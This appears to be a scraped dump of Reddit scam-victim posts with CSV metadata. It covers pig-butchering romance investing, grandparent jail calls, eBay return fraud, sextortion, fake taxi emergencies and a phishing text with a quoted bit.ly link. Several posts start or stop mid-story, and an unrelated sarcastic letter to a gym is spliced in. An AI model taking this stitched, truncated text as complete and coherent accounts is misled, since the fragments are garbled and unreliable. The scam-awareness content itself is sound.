The scammer stayed protected and clearly didn’t give a crap because today I got a message with a picture. The picture had MY username on here sitting on top of a brand new laptop in the box. The message said “I have more than one account tell your daughter thanks for the laptop rofl”. I know by the screenshots of those who donated that this person received hundreds. I can't post the picture anywhere. I shouldn't care though, right? “Oh well it's not like the donors had a gun to their head”, “Oh well they chose to donate to a stranger”, “Oh well you could be lying too”, “Oh well it’s the internet and you put it on here”, “Oh well...oh well bullshit!”.

These scammers get away with this because it’s always brushed off with cop outs. I don’t know how to stop this but it needs to be stopped. There are so many different scams but this is personal to me. I didn’t make a gofundme because I’m not on social media so I wouldn’t be able to share it, which was fine. People don’t donate to strangers unless it’s shared via the news or throughout social media.

Covid ruined us and asking for financial help from strangers wasn’t a possibility. This was so unexpected, I thought I had more time with her. I thought that by making memories instead of sitting on a computer all day was better until I realized we don’t have a single picture of us as a family. No videos. I was so adamant on being present as a family that I'm scrambling to take pictures and videos to document my daughter because I can’t hold my memories when she dies.

1620769628.0,Asian guy/girl from online dating mentors you to invest in Forex/Cryptocurrency Trading -- Sha Zhu Pan 杀猪盘 or Pig-Butchering Scam,"I  want to raise awareness on this Pig-Butchering scam or Sha Zhu Pan in Chinese. So called because victims are patiently worked on  everyday for 1-3 months before scamming them big time, like fattening up a pig before slaughter. Basically, the scammer induces the victim into putting more and more money into a sham investment platform.

They are seriously well-planned operations (latter half of this post) and have really been successful in the Chinese-speaking world, so much so that Sha Zhu Pan has become one of the top Chinese buzzwords in 2019-2020.  Victims are scammed on average $50k, and millions have been  lost. It's a huge cottage industry that Chinese police has had a hard time stamping out. There are scores of recent news stories, blogs, video  clips, and other media online about Sha Zhu Pan victims and scammers. Sadly, *almost all are in Chinese*. I think the rest of the world has to wise up to this, because now as most Chinese are becoming aware of this Pig-Butchering Scam,  the scammers are turning their skills more towards non-Chinese, more so this year.

This first half is somewhat detailed, because since everyone is generally aware of romance scams, being vague won't convince someone who is in the thick of it and thinks that his/her online friend is THE exception. Exposing specific details of the Pig-Butchering scam is most convincing to current victims that the ""spontaneous"" events are actually planned.

Common tactics of the Sha Zhu Pan scammer:

1. greets you ""good morning"" and ""good night"" *every day*
2. always asks/share pictures of food. Their ""home-cooked"" food looks restaurant quality
3. are sole owners of beauty salons/restaurants/hospitals/apartments/businesses etc
4. casually talks about spending tens and hundreds of thousands of US dollars like no big deal (makes you feel small)
5. typically by 2nd-3rd week of talking everyday brings up an investment/trading website
6. studied finance/accounting, or have uncle/aunt/brother/professor who taught them Forex/Crypto trading.
7. talks a lot about fate and destiny.
8. asks what are your material goals and dreams, and say you're not dreaming big
9. trade on irregular schedules, based on a day's ""data""/candle stick charts/insider info. Sometimes they say ""tomorrow's data is not  good, I'll just go by myself"", sometimes ""today is a go!"" (to intrigue you)
10. laughs at how ""small"" your investment is
11. When some event causes huge losses for both you and the guy/girl, he/she suggests you borrow from the website.
12. When you're compelled by the website to pay some ridiculous amount, the guy/girl offers to ""help"" you pay half or so. You never see their money though because they pay directly to your ""account"".
13. guilts you, blames you, gaslights you, flip out easily, shames your  manhood/adulting skills/commitment to relationship, accuses you of  character defects, anything that hits home
14. always have an excuse for not wanting to meet up or do video chat -- bad experience with exes, pandemic, etc. Actually, they really can't. They're not where you think they are.

Common elements of the sham trading platform website:

1. Highly responsive ""customer service"" online or on WhatsApp, available to chat 24/7. They are always oh so courteous and never break character, no matter how much verbal abuse you  dish
2. When you've put <$10,000, you can take your money and earnings in and out
3. Offers large bonuses if you invest 30-100% more by a certain date soon (like this weekend).
4. Once you put in substantial amounts of money, the slaughter: You'll never be able to take anything out ever again.
5. To pay back ""reserve loans"", ""taxes"", ""verification fees"", anything, you have to *pay from outside;* they **cannot** be deducted from your ""account"" inside (they never say so beforehand).
6. Your ""account"" gets frozen for defaulting on loans, not passing verification, whatever. You have to pay in 7 days before they start deducting 10%  everyday from your investment and ""earnings"".
7. One time you send a large payment, they hurriedly tell you that you sent to a ""retired"" address!!! Later they decide you can make up for it by paying a 'reduced' amount.
8. Even if you pay everything, they'll keep coming up with reasons to prevent withdrawals. But your investment inside has already doubled! So you can't give up... and they'll never run out of  excuses

Ok. Well, if that is the   case, then I will just keep my account open. I re-read the contract I signed   with Vasa and you are in fact correct that you are under no obligation to act   in a civilized, fair, or in any manner at all that even remotely resembles integrity.   With that being said, I did not see anything in the contract stating   customers are not permitted to take a shit in the gym's pool.  
I imagine that most people have enough integrity to no do so, but it is   obvious that integrity is not valued by Vasa. I have never shit in a pool   before, but I imagine it would feel pretty liberating. No hard, cold toilet   seat. Not having to use some abrasive paper to cleanse yourself. The idea of   it is actually extremely appealing.  
I look forward to being apart of the Vasa family, and cannot wait until your   doors reopen.

Warm regards.

1683421095.0,Family got Scammed,"IDK if this kind of post is appropriate for this sub but I just need to vent because we're having such a hard time. My in-laws were scammed out of $300,000. We just found out last week that they cashed out their 401K and gave it to scammers claiming to be DEA agents. They think they'll be ok financially and my siblings-in-law are kind of like ""well shoot. lesson learned I guess"". But myself and my husband are struggling with the whole thing because we really thought that they were smarter than this. It's SO much money that's just gone. They say they'll be ok, but they also thought wiring $300,000 to someone over the phone based off of a badge number was a good idea. My husband is pushing for them to sell their home and move closer to us so that we can keep an eye on them as they age but it's been a controversial push within the family. I just don't know what to do.

Edit: Thank you to everyone for your responses! It was nice to wake up to so much sympathy and advice. I would not have known about recovery scams if it weren't for this subreddit. I've passed that info along to all family members involved and we'll be as diligent as possible in making sure they don't fall for such a thing. My husband and I have felt alone in our extreme anger at this whole situation and it's been nice to hear support from this community, so thank you all very much. 

Also, the DMs! Why doesn't reddit have a report option for scammers? I guess spam is the closest but goodammit. ",Scams,1481,281,39,1
1689663207.0,Onvoy Landline Caller called to tell me he killed our cat.,"So almost a week ago, my sisters cat went missing during a thunderstorm. For two days now, we’ve been posting all over and even put up a few flyers around the neighborhood with our contact numbers on it of course. 

Tonight at 12:06am so midnight, my sister (19) got a missed call and asked me to call it back and see if it was about her cat. 

I (21 F) called the number once, someone picked up then hung up. I called again, picked up then hung up. So I sent a text saying “Hi, just calling to return a call I received earlier.” and they responded “No you’re not, relax” I responded “So you didn’t call the number ending in - - - -?” He goes “I did not.” In the process of texting I called again and he answers and goes “I was just calling about your cat to tell you he’s dead.” then hung up. I called again “how do you know?” and he goes “because I killed him” then hung up. He wouldn’t answer me why, just kept texting me telling me to stop texting him. I texted back once more and begged him to tell me how he did it to my sisters cat and this time he calls me. My boyfriend answers and says “hello.” Nobody answers so my boyfriend hangs up. He then proceeds to call back twice before I end up blocking him. 

It’s now 2:42am and I can’t sleep because now I can’t stop thinking about how someone killed our cat and how he did it. His tone of voice when he said “he’s dead” and “i killed him” was so stern and scary it made my whole body go hot and made me wonder if it was even an accident or if was even true at all. 

I looked up the number on Spokeo, and even paid the 95¢ to see all of the information, the address is about 4.5 miles away from my house (first made me wonder if our cat would even go or get that far…) and then I seen that the phone was a landline and the carrier was Onvoy. My first initial thought was how can this person be texting me from a landline??? I then looked up what Onvoy because i’ve never heard of it before and one of the first few posts was “Onvoy…landline call scam” or something like that. I was reading another post on reddit about them and how they thought they were talking to real people but not to tell them something morbid like their cat being dead. Our boy is so loving and affectionate he would come to you if you called him which only makes me sicker to think about if this is really the truth and our cat died in, with how the guy sounded, a horribly painful way…

I don’t even know what to do at this point.

1623377820.0,Gas station scam,"TLDR; gas station attendant tried to scam me into paying an extra $20 claiming there was a mistake, despite my card statement saying I paid the correct amount. 

So I was far away from home on a business trip, via car. On the way home I stopped at a  relatively small gas station. I didn't need gas yet but it was populated and being from out of town I thought it would be pretty safe. Being a small person, I'm fairly aware of what's going on around me- I pulled up to pump 1, someone in front of me pulled up to pump 3, and there was someone at pump 5 already pumping their gas. 

After I fill up and I'm about to drive off, the attendant comes out looking angry and waving his hands. He comes up and says that the person on pump 5 accidentally put $20 on pump 1 and that when I filled up I used his $20 towards my gas and I needed to come in and pay the difference. I thought that was pretty weird because the person from pump 5 was long gone. I said okay well let me check my bank account. I checked and it matched my receipt of $36. I told him that and he said no you used $56 worth of gas. 

I have a relatively small tank and I was about a 3rd full to begin with so I told him it was impossible for me to have used that much gas because my tank wouldn't hold it. He started screaming at me that I'm stealing from him and gathered a lot of attention that there was ""someone stealing gas"". I kept repeating that my car wouldn't hold that much gas and the cost/gallons shown on my receipt line up with how much my tank needed. He continued screaming that I wasn't allowed to leave until I paid and had another attendant stand in front of my car while he took a picture of my license plate and said if I leave he would call the police on me for theft. I told him I'd do him one better, I'd call the police for him right now so we can go ahead and settle this. 

So he went back inside and I called. He comes back outside a few minutes later to tell me ""I'm in luck"" because someone has ""paid my debt"" and I ""can leave"". I tell him no, the police have already been called and we can settle it when they get here. He insists that I leave and to tell the police not to come and that everything is ""fine"" now. I'm not one to call the police over what feels like a petty $20 but at this point with his picture of my license plate, I don't trust him to not call them after I leave so I wait for them.

Once the police get there and speak to him he says ""oh it was a mistake I thought they were someone else who was stealing from me"" and due to lack of evidence that they were trying to scam me that's where it ended. I have never experienced something so aggressive and bizarre but apparently some small gas station owners will try to con people out of money with claims like that. After looking at reviews, I'm not the first person they've scammed/tried to scam either. At first I thought it was an honest misunderstanding but after reading the reviews and him back pedaling after I called the police, I have no doubt he was trying to scam me.

It turns out some scammers called my grandparents telling them that this was my last phone call, and I'm in jail and I need money to get out. They even had a crying girl on the other end pretending to be me, and begging them to give the money. So they took out over 10,000 USD from the bank.

But I wanted to come on an warn that for the first time, I got an email from a scammer that was able to spoof a legit government email address. I got an email from the “Social Security Administration” about something I submitted online and they sent me a “receipt”. Obviously my first though was SCAM. But checking the sender email it read ‘no-reply@ssa.gov’. 

I did my searching online and the SSA will indeed send you an email if you perform services online, and the government website listed no-reply@ssa.gov as a real official email address. 

So naturally I start slightly getting worried, thinking ok this is real and someone might be trying to steal my identity. I click the attachment on the email and immediately get a pop up from my anti-virus that it’s a Trojan attachment. 

Thankfully I had that running and it saved me. I sent a scam report to SSA. Be vigilant guys. I’ve never seen a scam from a legit email address.",Scams,981,176,17,1

The man asked me if I could help him fill up his car since he only had 3 miles left in the tank, and the first thing he did was offer me his gold ring as compensation. I thought I could lend a hand so he followed me to the nearest gas station where I filled up his tank. While filling up his tank he told me that he needed to get to California and that he was driving a rental and he needed money, around $500 for fuel and food to get there because his cards didn’t work in the US. He showed me his daughter, who was pleading as well, and his baby with his brother in the front seat and that he barely had any money to even buy formula for his baby. He pulled off his gold chain and a ring he said both were $5,000 and again I asked him if he had this much money why couldn’t he just trade them for cash, which I instant gave back because I just wanted to do something good, and he said that Americans wouldn’t be willing to work with him because he’s Arabic. VERY reluctantly my heart gave in because I hate seeing children in need. And I went to the nearest ATM and gave him $400 for he needed for his travels. What gets to me is how he sped off even before I could get to my car, and now that I’m typing this out I feel like I just definitely got scammed.

1617077831.0,I have been buying and selling tech on the internet for 10 years and I'm the victim of a sophisticated scam on eBay. This is what happened and this is what I learned (eBay return fraud),"[**Part 2 of this story is here**](https://www.reddit.com/r/Scams/comments/mz5amg/update_with_good_news_i_have_been_buying_and/)

March 6: I listed a Samsung Galaxy Watch Active2 on eBay with a price of $179. [Here is the listing for the watch that I sold](https://www.ebay.com/itm/Samsung-Galaxy-Watch-Active2-Black-44mm-with-LTE/353411193927)

March  7: Someone purchased the watch. The address was listed as Fisher,  Illinois. I noticed that the buyer was a brand new account and it was  made on March 7, with 0 feedback.

March 8: I shipped out the package.

March  15: The buyer made a return request and claimed that the touch bezel  for the watch is broken. I sent a link to the buyer telling them how to  turn on the touch bezel, and to respond if they still need a refund.  Even though I did not accept returns, buyers can return an item if they  claim it does not work.

March 18:  The buyer asked eBay to step in and make a decision about the return.  eBay sided with the buyer and the buyer was told to return the item.

March  24: The tracking information was updated and it showed that the item  was picked up in Ladson, South Carolina. The return came from South  Carolina even though I shipped the item to Illinois.

March 26: USPS tracking said the item was delivered to my address. I checked the mail and I did not find any package. [Here is the tracking information for the package](https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&tLc=2&text28777=&tLabels=9302020585500041261238%2C&tABt=false)

March  27: I called USPS and asked why the package was not delivered. After a  few minutes on hold, the clerk came back and told me that the package  was not delivered to my address, it was delivered to a different address  on the same street, because the shipping label had 37xx Avenue instead  of my address, which is 75xx (numbers have been altered for anonymity).  The clerk also told me that the mail carrier is a veteran with 20+ years  of experience, and it is unlikely that he/she made a mistake.

March  27: I made an appeal to eBay and I wrote in my appeal that: (1) The  item was not returned to my address, it was returned to a different  address on my street (2) I did not receive any package from the buyer,  and I do not have the Samsung Galaxy Watch that I sold (3) The return  package was picked up in South Carolina even though I sent the package  to Illinois, and the two places are \~800 miles away from each other (4)  The seller is a brand new eBay account with 0 feedback.

March  27: eBay made a decision in the appeal and sided with the buyer,  because the tracking information said that the item was delivered. eBay  believed that the item was delivered even when the package did not  arrive at my address.

March 29: I  went to my local Post Office and asked the employees if they could  provide me a picture of the shipping label when it was scanned into my  local Post Office. They were able to give me a picture. [Here is a picture of the scanned shipping label.](https://i.imgur.com/0tQ88kd.jpeg)  The receiving address was not my address, it was an address 2-3 miles  away from my house. The sending address was neither Illinois nor South  Carolina, it was New York, even though USPS scanned the item and picked  it up in SC.

March 29: I have  contacted eBay with a picture of the shipping label but eBay says an  appeal can only be made one time. I had told eBay during my original  appeal that USPS said the item was delivered to a different address and  not my address, but that was not enough, and I am not being allowed to  add information to my appeal.

Right  now: I do not have the Samsung Galaxy Watch that I sold to the buyer,  and eBay is telling me I have to pay $183 ($179 for the watch and $4 for  the buyer's return shipping).

**What did I learn from my experience?**

1. It  doesn't matter if you are selling an item and say ""Buyer does not  accept returns"". The buyer can create any reason to return an item and  eBay will not ask the buyer for proof.
2. A  buyer does not have to return an item to your street address, the  return can go to any address in your city and ZIP code and eBay will  assume that the address is correct
3. If  you make an appeal to eBay, make sure you have physical proof that the  item was not delivered to your address, and provide that information  with your appeal. An appeal can only be made one time and within 30 days  of eBay making a final decision.
4. The  tracking information on the USPS website does NOT have to match the  shipping label that the buyer puts on the package. USPS will deliver a  package to the address written on the package, not the address in the  computer database.
5. Beware of new eBay accounts with 0 feedback! They might try to scam you like they did to me :(

**What should you do if this happens to you?**

* No matter how tempting it is, do not immediately send an appeal to eBay. Wait and gather all of the evidence that you can gather to prove that you are being scammed. You have up to 30 days to make an appeal but you can only appeal one time
* Have physical proof that the package was not delivered to your address. Out of all the evidence that can be shown, I think this is the strongest kind.
* Understand that 100% of the work will fall on you. eBay is extremely accommodating to buyers, even buyers with brand new eBay accounts and three different addresses.

1684935050.0,I got blackmailed over snapchat last night and this was my experience.,"I met a girl from a dating app last night and added her on snapchat to get to know her. She asked how old I was and when I replied 19, she said that she was also 19. She told me she had just gotten nose surgery so she looked awful but she had an instagram that I could look at. The instagram looked real with real followers and real posts that matched her profile on the dating app. She also had a high snapchat so I was confident it was a real person. After things start heating up, she asks me to send a photo of how big i was. Normally I don’t do this kind of thing but for some reason last night I was intrigued. The photo I sent wasn’t even a nude, and she immediately screenshotted the photo and threatened to send it to my family and friends which she found from my instagram. I was told I had the option of giving the username and password for my snapchat, pay her for a dress, or she would dm 50 people exposing me. She also told me she was 17 even though she told me the night before that she was 19 and she lied about her age on the dating app. I was completely stuck with no way out and was panicking. I agreed to pay for the dress which she ended up making me pay 100 dollars for. I don’t have that much money at this point of my life but i agreed and paid just so it would all be over. After i sent the money she mocked me asking if I thought we were done even though she had promised that she would delete the screenshot and leave me alone. I ended up paying another 165 and had to beg and negotiate down from another 250 because I only had 166 left in my account. She took all the money on my debit card. The worst part was sitting there while she manipulated the fuck out of me knowing there was nothing I could do. After paying the second charge, she deleted the screenshot, but threatened me saying if there were any problems she would have her brother recover the photos from her icloud even after they were deleted from recently deleted. Is this possible? Also are there any steps I should be taking? I wanted to write about it to spread the word about these types of scams and ease my anxiety a bit. Although the money went through, It hasn’t been deducted from my account yet and I’m worried there will be some problem and she will release the photo.

UPDATE:

The scammer has been blocked on snapchat, I changed my snapchat username, and disabled my instagram (they blocked me first so I couldn’t find the account). I’m glad I found this group and decided to post because it showed me how stupidly I approached the whole situation. If I had just blocked and moved on nothing would have happened and even if it did, like many of you said who even cares that much?

1607026597.0,[SCAM] Taxi driver rushing to the hospital.,"I feel like an absolute moron for falling for this. 

Backstory:

I live in an incredibly crowded city, and got into a cab during a busy hour. I was with my bf and siblings on our way back home.

We get into this taxi, and the driver looks very shaken, keeps checking phone. His phone rings, he picks it up, and after a few mumbles from the other starts yelling “what? BUT IT’S NOT TIME YET” so obviously my ears perk up. He starts to sob and hangs up, and says “You have brought me good fortune, my wife is giving birth! “, so we’re all ecstatic. He goes on to tell us that he has wanted a kid with his wife for 13 years and how they had a miscarriage, how he’s so excited to be a father, how the baby wasn’t due for another 2 months and had lung issues but he should be fine now. 

Cue another phone call. Chatter from the other end, his voice drops, “I can’t afford that”, (chatter) “What are we going to do?” “No we can’t, I don’t have the money...I’ll drop my customer off and I’ll be on my way... We aren’t prepared...”

Obviously, we’re all invested in this dude’s baby. I ask him if everything is okay. He’s now crying in a way which is gut wrenching, they will have to keep the baby in an incubator, which he will have to buy, and his wife has to have a c section. No, his insurance doesn’t cover for these things and they’ll have to wait in line. He cant go to a private hospital, he’s in a lot of debt, but no, please don’t worry about him, he’s always found his way. We are all very distressed, and yet we assure him his baby will be fine. We will most definitely hold him in our thoughts and wish him very well. The guy asks if we’re okay to walk home, he has to rush to the hospital. Of course, we say, your baby will be fine, have faith. He’s telling us the cost of our ride - somewhere around 25 - and we gave him 200, because come on, the guy is in debt and is about to be a father, we’re very worried and also happy for him. 

He’s looking incredibly thankful as well as embarrassed to take the money and rushes off immediately. We’re all feeling amazing, very blessed to take part in such an exciting moment in someone’s life. We talk about it for weeks and kept wishing the baby well amongst each other. 

Well, back to tonight. 

After a very long day looking forward to nothing more than to get back home, I haul a taxi. The guy looks completely fine until I get in the car. It’s traffic hour again, and as soon as we move his phone calls. 

Similar blabbering. 

Cue the waterworks, he says to the person on the phone “She’s not due yet! What hospital?”. 

I’m already feeling very very odd, like I’m in a deja vu, except I know for a fact it’s not. He hangs up and turns around, and says, “You have brought me good fortune, my wife is giving birth!” - WORD. BY. WORD. THE EXACT REPLICA OF WHAT THAT OTHER DUDE HAD SAID. I thought, what are the odds of this? No. This can’t be a coincidence. I got paranoid thinking I landed the same taxi driver, who had some mental disorder and lived his life in the limbo of his wife being in labor but never delivering. But no, his voice was different, and the other guy was balding, but this driver had a reasonable amount of hair. 

I’m in complete disbelief. I was just quiet, all I could do is my best impression of Owen Wilson: “Wow.” 

“My wife and I have been trying to have a kid for over a decade now! She’s had a miscarriage before...”, it’s shocking how incredibly convincing he was. Tears, shaking from the crying and the sound of genuine excitement in his voice. I know that if I hadn’t encountered this before, I would have been absolutely in awe and would have felt like I was lucky to get to share this news with this clearly incredibly happy man.
Idk if any of you have ever been high, but it just felt like I was in that loopy state of perpetual “what the actual fuck”, like I had lost my mind but I knew I hadn’t and that this was, very much real. Due to the traffic, we aren’t moving much, I’m questioning if I should leg it.

The taxi driver turns around in his seat and stares at me, probably due to my lack of reaction. “Thank you for blessing me with your luck” he presses, and turns back. He receives the second call. Same story, emergency c section, incubator. He hangs up and tells me he’s stressed, being a father is financial responsibility. It’s been a few minutes, we make eye contact from the rear view mirror. He’s asking me if I’m okay. I tell him its not the first time this happens. He looks at me again and asks me what I mean, what is it that isn’t happening for the first time. I tell him I was in a cab and the driver had received similar news.

Mind you, due to how credible their acting was, it still had not occurred to me that this was, in fact, a con. My brain just went into shut down, trying to come up with any other explanation, because, how could they fake such authentic emotions? No one would do that. 

No, missedemeanor, you idiot, of course this is a scam. How could he relay the exact same thing. 

As soon as I let him know how similar his story was, he pulls over to the side; as has to get to the hospital, he’s sorry, could I be polite enough to get off? He tells me the price, looks at me again. Never mind, he doesn’t want me to pay, oh but only if you can pay some of it that would be great. 


I got off and I only realized as soon as he drove off that this was, indeed, a scam. Duh. I call my mom and tell her, she says I should have told her the first time I encountered it, she had 5 drivers over the years try to con her this way. I text my bf, he’s really amused but also clearly sad about how incredibly mean it is. 

I get into another cab and my first instinct is to ask him if his wife is pregnant, and obviously this dude looks at me like I’m batshit insane, and proceeds to ask me if I’m okay. I tell him about this and he can’t stop laughing, saying that’s the most evilest thing he has ever heard but also that I should have known that nobody would ever bother taking someone on a ride if their wife was about to give birth.

So there you go, idk if this is the place for it, but I kind of had to get this off my chest, I guess

So stay safe and beware of dodgy taxi drivers, especially if the first thing they tell you is that you’re some kind of stork for bringing them a baby. And if they really are about to become a father, just congratulate them, don’t offer an extra parting gift. 

TL;DR: I generously fall for an emotional con involving the beauty of fatherhood and false babies.",Scams,6525,1278,187,1

1636709362.0,I just got scammed 25k as a 20 year old and I just needed to vent out :(,"Hi everyone, I’m from Sacramento. I am in Hawaii right now for vacation.. I will just try to keep this simple. I arrived in Hawaii last November 6, my card got blocked on November 7 because I forgot to tell the bank that I was going out of state, I immediately called the bank to inform them about the situation and my card was back to normal, All is well. Fast forward to today, I received a text that said “Golden1 Alerts: Your online banking has been locked due to unusual activity. Please sign in & update your account information at: bit.ly/30jCSWj” and I immediately thought that it was just my bank following up from my call days ago because I’m in a different state, so I didn’t think twice about it. The link led me to a Golden1 website and asked for my info, I inputted my social security, debit card info, basically all my important info there (later I realized that the scammers just recreated the website to make it look like my bank’s website-It looked so legitimate and authentic). After some time I thought that the text message and the website was a bit suspicious so I immediately locked my cards, changed my bank password and tried to call the Bank, unfortunately the bank is closed because it’s veteran’s day. I was thinking that I should just handle this tomorrow when the bank opens. I kept checking my accounts for suspicious activities and about an hour or two later someone wired all of my savings out of my account, I was panicking and didn’t know what to do because I thought that I already locked my card. That was the time that I realized that I just got scammed all of my savings. They locked me out of my bank account and I can’t do anything anymore. My family who is in the bank industry told me to install 3 credit  freeze apps, transunion, equifax, and experian, they also told me to do lifelock. Currently, I am just so shocked and I’m feeling so numb because I am a recent immigrant and I worked so hard to get that money and the money was for my college, I don’t know how I can move on from this. It’s 11:20 in hawaii right now and I don’t think I can sleep at all. I will be calling the bank first thing tomorrow and hope for the best. If anyone has any suggestions what I should do or just words of encouragement it would be greatly appreciated, thank you

Update: 7:22am hawaii time. After a sleepless night filled with body tremors, night sweats, and anxiety,I GOT IT BACK!!!!!!  I just called the bank and it took them almost an hour to fix everything, they mostly put me on hold throughout the process. She didn’t really explain that much what happened but said that it was an internal transfer and it’ll take time to get the funds back, at the end of the call I finally got it back, Thank you Golden 1! Currently they will be restricting all of my transactions, they said that I can go to a certain bank here in Hawaii to withdraw money but I need to call them so that they can unrestrict while I withdraw my money and after doing my transaction restrict my profile as soon as I get the withdrawal, but I won’t be doing any withdrawals here anymore just to be sure and just wait until I go back to Sacramento when I get to talk to somebody in the bank personally. I am so so happy right now words can’t describe how I feel. Thank you everyone for all your input. i will remember this experience and all of you for the rest of my life. Yesterday was the worst day of my life and today was one of the best for sure :). I hope this could be a learning experience for everyone and again I am very grateful for all of you that gave me words of encouragement and advice.",Scams,3608,683,66,1
1693080695.0,I just want to ask everyone here to try to be nicer.,"There are posts here of people losing thousands of dollars and not only there are comments making fun of the victims, blaming them, insulting and pointing at the stupidity of falling for a scam, you also downvote their comments just explaining what they were thinking at the time. 

I get it, you can see how stupid and obvious it is when people fall for some of these scams. But dude, some people here are going to spend years recovering from these scammers, they come here seeking help with some of the worst mistakes they have ever made. You got some nerve to insult or treat badly someone in that low of a point. I know you kinda want to feel better about yourself, but have a little empathy would you? Your snarky comment might just be the thing that pushes that person to end it all. You never know how much damage you can do in these situations with a stupid comment. You got nothing to gain other than making a person in a low point feel even worse. You're only worsening it. 

Scammers don't prey on the stupid, they prey on the innocent, the ignorant, the good hearted people, the people that desperately need something the scammers are making them believe they will get, only to take everything they can out of them. That's really messed up, and so is just insulting, making fun of and blaming the victim of these scumbags. If you're not going to help, just please don't make it worse!

Edit: Ok so a few people here are arguing that scammers do target (what you consider) stupid people. You can also say that kids are stupid and so they easily fall for people with bad intentions. That doesn't make it right to insult them when they do. Even by that standard, if you consider that these persons are stupid, meaning they don't have the intelligence nor the capacity to see through deceptions and lies, it's even worse, because you're just insulting, blaming and laughing at someone that didn't even have a chance. You might consider you are way smarter, but if you're here commenting these kinds of things to scammer victims, consider this too: you may be smart but you're also a pretty crappy person.",Scams,2112,380,53,1

I fought really hard with Wells Fargo, the bank I used Zelle through and even had screenshots of where they were misleading customers about zelle. I did everything I could including reporting to federal online bureaus.

 2 years ago I accepted that I lost the money and I beat myself up for it. I joined this subreddit to make sure it never happened again. Fast forward to today. I get a letter from WF addressing how my ""disputed Zelle payments required reevaluation and a refund was warranted"". I got a check for the full amount lost plus interest. I couldn't believe it. My guess is they are being forced to repay claims during a certain period. I'm glad this had a happy ending, but I sure did leanlrn a lot from it.

1683386542.0,BEWARE OF THIS REDDITOR,"Hello, I experienced a scam yesterday from a Redditor and I'd like to make everyone aware of it. 

I made a post asking for tips in how to deal with my eviction, and I ended up getting a DM from Logical_Peak_9305. They said they wanted to help me. According to them, I would handle bookkeeping and ""funds disbursement"" and would be paid for my work. I told them that I had no experience with that, but I was willing to learn and he seemed ok with that. He told me that he would give me a task to test how tech savvy I was, and that task ended up being Bitcoin flipping. Poor communication led to me first putting $10 which was too little, so he said to put $50, and then another $50 to ""cover fees"" with the escrow agent. By then it started going downhill, I was starting to get scared and I sent the second $50 to an expired Bitcoin address and he started freaking out. After that we switched to Discord. He told me I had to pay to retract the $50. At that point I was crying and just wanted my money back, and I told him so, and he reassured me he would source my refund. I gave another $90 to buy malware and pay for an override fee. After that, he said the agent needed my bank account's username and password, and that was when I realized I was scammed. He tried to get me to pay for more malware to get my refund back but I told him I didnt have much money left. We argued for a bit and then I blocked him. 

This man/person/wtv was methodical. He played sympathy for my vulnerable situation and acted like he truly cared about the worries I had. He reassured me everything would work out and that we would ""look back and laugh"" about it. PLEASE do not fall for this like I did. I know it sounds stupid when it's someone else, thats what I've always thought, but when it happens to you, you don't even realize it's happening until it's too late.",Scams,1851,360,48,1
1686496467.0,"Met a girl online, she taught me about this international lottery website. Was making money until...","So this is gonna be a doozyy. Hey so I met this girl who messaged me on Facebook last month, we really hit it off and she told me she has this super hiperfixation on Maths, and apparently, she is earning a lot of money from this website

I was skeptical, but in the end I played it with her, her explanation is that she has a system on predicting the highest possible outcome on the ball roll. And we did win some money (600 usd+)

The website uses USDT as its currency, and I can deposit and withdraw USDT from the website. I find the first 3 deposit and withdraws to be successful. But one time, she convinced me to up my deposit to 5000USDT, which I did. 

So the website allow you to bet on Small or Big number basically. But apparently you cant bet both Small and Big, cause then you will have no risk ( this will be relevant soon)

I SWEAR I followed what she asked me to bet on like usual, then suddenly... my money is reduced to 0 and it is frozen, her money too (from what I see from her ScreenShot). Then we ask the Customer Service to explain what happened, and they found out that apprently my account has bet on Big and Small on one betting cycle (which is forbidden as I mentioned above). So the CS explanation to why both our money account is frozen is that they found out that we bet the same thing at the same time, but they just found out cause I made the mistake on betting Big and Small at the same time( which I swear did not do)

So she apparently have 40k USDT in her account, and she freaked out and she called me like 2am in the morning to blame me for everything

The reason why I thought this is a Scam is that because :
- I am almost 100% certain that I didnt make a mistake during the betting
-And the money is frozen so conviniently after I deposit large sum of money
-after the money is frozen, the CS said that the money can be unfrozen, but we need to deposit 100% of the amount of the money that is frozen (another very scammy like sentence)
- and the timing is just too convinient to not be a Scam

The reason why I think this is not a Scam
- i bonded personally with the girl. We are from the same country. We called each other, we share things about ourselves. We talked jokingly about having a family together, and how I would take her to dinner. This is just too real
- she cried and called  me when they said her money is frozen. It was so real, a real tearjerking cry, it cant be fake. What if I am an idiot that actually made the betting mistake?
- she still chats with me trying to unfrozen her money asking for my help. I think most scammer would have been satisfied with the $5000, if she is a scammer, wouldnt she just ghosts me then?

F*ck I am in such dilemma. Am I the an actual idiot who cant bet properly or this is just the most elaborate scam scheme ever? I checked the website as well it said that it was created 3 months ago, while she said that she has been playing the lottery for 2 years(can anybody actually help me check if the website is actually longer than it is though?
Now I dont know, i can just be content on losing $5000? I thought I made a real connection

Crazy part is - they are being shipped to our physical address but addressed to the fake name from the account who threatened him. WTF? I have no idea what their game plan is with this, but it’s got us freaked out that they know where we live and are messing with him. We have kids and they are sending us stuff similar to things on our Amazon wish list (example: dog clippers, a crib mat, usb cords - all stuff we have bought recently or had in our Amazon cart at one point) It’s like they are taunting him. Has anyone heard of this or know what we should do? We’ve already cancelled his card and are disputing charges.",Scams,2225,414,48,1
1553295146.0,Stopped an old lady from buying a $200 Google play card at the grocery store,"An old (mid 50’s) lady was in front of me at the grocery store, with a Google Play gift card. She was asking the sales clerk if she could get a refund if the card wasn’t the right one. The clerk looked concerned and another turned around and began listening. I heard that Apple called her and they needed money to fix something on her computer. As soon as I heard that I interrupted and told her it was a scam and explained why. She seemed relieved and the clerks said that she should just contact Apple if she’s worried there’s a problem.
The grocery store clerk told me that they have training, specifically designed to prevent the elderly from falling for scams.

REMEMBER, talk with the old people in your life and educate them on the tactics of scammers!

Edit: forgive me for my implicit bias against the AARP members of Reddit, but seriously, I do see now I associated technological naïveté with the elderly. 

Double Edit: I found this great article which deals specifically with the discussion of [How old is old](https://www.npr.org/2013/03/12/174124992/an-age-old-problem-who-is-elderly) 
I’d like to quote from the article:

1639749699.0,Saw a scam in person at the airport,"While waiting in line for security check, this man comes into line, inserting himself in the middle of the line, and makes an announcement. ""Ladies and gentlemen, we have an emergency situation here!"" He then goes on to say how his bag is overweight and he needs to raise $180, since he needs $300 to check the bags, and only has $120 on him. He says he has a ticket as proof of anyone needs to see, also its for his son who is an army vet,"" please, it's not for me, it's for my son!""

I looked over to my husband, because the whole thing was bizarre to begin with, and you could hear the man constantly pleading and saying in a stage whisper ""God, this is so embarrassing!""

